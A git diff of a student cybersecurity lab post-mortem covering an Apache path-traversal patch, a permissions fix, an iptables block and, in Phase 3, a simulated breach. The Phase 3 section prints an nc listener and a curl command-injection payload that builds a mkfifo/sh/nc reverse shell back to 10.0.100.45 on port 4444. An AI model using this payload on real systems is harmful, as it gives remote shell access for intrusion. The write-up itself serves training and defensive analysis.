@@ -1,7 +1,10 @@
 # Phase 1 Final Reckoning — TEPP Post-Mortem
 **Operator:** Kenneth Cardona
+
 **Date:** May 28, 2026
+
 **Repository:** https://github.com/kennethcardona07/Phase1.git
+
 **TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**
 
 ---
@@ -38,6 +41,7 @@ bypassed root boundaries to access system files.
 docker exec -it server1_web_1 /bin/bash
 apt-get update && apt-get install --only-upgrade apache2 -y
 exit
+```
 
 
 **Before State:**
@@ -106,15 +110,8 @@ Security Stance: Write permissions are now strictly restricted to root administr
 **Analysis:**
 Leaving critical directories wide open with world-writable permissions violates the core security rule of least privilege. According to the Cybersecurity and Infrastructure Security Agency 
 (CISA, 2023), when basic service accounts are allowed to modify system configurations or database variables, local privilege escalation becomes incredibly easy. 
-In a corporate environment, an attacker who gains a small foothold on a web server can exploit these weak permissions to hijack application logic, steal API keys, or permanently alter backend data.
+In a corporate environment, an attacker who gains a small foothold on a web server can exploit these weak permissions to hijack application logic, steal API keys, or permanently alter backend data
 
-## References
-
-* Cybersecurity and Infrastructure Security Agency (CISA). (2023). *Securing enterprise data repositories: Best practices for access control and internal file system hardening* 
-(Mitigation Guide No. 23-112). U.S. Department of Homeland Security.
-* Microsoft Security Response Center. (2020). *Defending enterprise infrastructure: Mitigating lateral movement and securing legacy remote administration protocols* (Strategy Whitepaper). 
-Microsoft Corporation.
-* Mitre CVE Program. (2021). *CVE-2021-41773: Apache HTTP Server path traversal and file disclosure vulnerability*. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
 
 ## Phase 2: The Breach
 
@@ -127,9 +124,10 @@ Microsoft Corporation.
 - Attacker IP Address: 192.168.10.45
 
 **Engineered iptables Rule:**
+
 ```bash
 sudo iptables -A INPUT -s 192.168.10.45 -j DROP
-
+```
 **SOC Analysis:**
 A single host-based firewall rule is insufficient because an attacker can easily rotate their source IP address or leverage proxies to bypass the block entirely. 
 According to the Microsoft Security Response Center (2020), defensive engineering requires a defense-in-depth model rather than relying on a static network edge entry. To adequately mitigate threat 
@@ -141,10 +139,11 @@ authentication attacks.
 ## Phase 3: Full Spectrum
 
 **Listener Configuration:**
+
 The local listener was established on port 4444 using Netcat to intercept the incoming reverse shell connection from the target container.
 ```bash
 nc -lvnp 4444
-
+```
 **Reverse Shell Payload:**
 The exploit was triggered by injecting a combined command syntax into the vulnerable web application input parameter via a crafted HTTP POST request using curl:
 curl -X POST [http://172.100.0.11/submit](http://172.100.0.11/submit) -d "ip=127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.100.45 4444 >/tmp/f"
@@ -167,3 +166,11 @@ Executing this attack from both the offensive and defensive perspectives highlig
 fails to address root web application logic flaws that allow remote execution access. According to the Cybersecurity and Infrastructure Security Agency (CISA, 2023), a comprehensive defensive stance
 requires input validation and parameterized API configurations. If strict input sanitization had been enforced initially, the application would have treated the shell characters as literal text 
 strings, blocking the injection route and neutralizing the breach entirely.
+
+## References
+
+* Cybersecurity and Infrastructure Security Agency (CISA). (2023). *Securing enterprise data repositories: Best practices for access control and internal file system hardening*
+(Mitigation Guide No. 23-112). U.S. Department of Homeland Security.
+* Microsoft Security Response Center. (2020). *Defending enterprise infrastructure: Mitigating lateral movement and securing legacy remote administration protocols* (Strategy Whitepaper).
+Microsoft Corporation.
+* Mitre CVE Program. (2021). *CVE-2021-41773: Apache HTTP Server path traversal and file disclosure vulnerability*. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
